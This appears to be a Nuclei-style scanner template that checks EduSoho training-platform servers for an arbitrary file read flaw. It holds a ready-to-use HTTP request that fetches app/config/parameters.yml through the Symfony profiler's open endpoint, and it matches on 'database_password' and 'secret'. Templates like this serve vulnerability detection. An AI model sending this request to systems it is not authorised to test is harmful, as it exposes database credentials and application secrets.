id: edusoho-education-open-fileread

info:
  name: EduSoho 教培系统 open 文件 file 任意文件读取
  author: HuanXiong
  severity: high

  tags: File Reading

http:
  - raw:
      - |
        GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "database_password"
          - "secret"
        part: body
        condition: and